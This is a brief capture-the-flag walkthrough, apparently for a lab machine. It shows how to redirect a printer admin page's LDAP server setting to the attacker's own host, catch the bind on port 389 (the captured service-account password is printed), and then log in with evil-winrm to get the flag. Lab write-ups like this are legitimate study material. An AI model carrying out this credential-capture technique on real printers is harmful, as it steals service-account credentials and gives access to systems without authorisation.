there is an ISS on port 80 which shows an admin configuration page for a printer. Here you can send a POST which only contains IP so you can only change the server IP for the printer which will likely try to authenticate after the change

so open a server on port 389 and wait:

connect to [10.10.16.5] from (UNKNOWN) [10.10.11.108] 54951
0*`%return\svc-printer�
                       1edFg43012!!

the user can directly use evilwinrm and access the flag


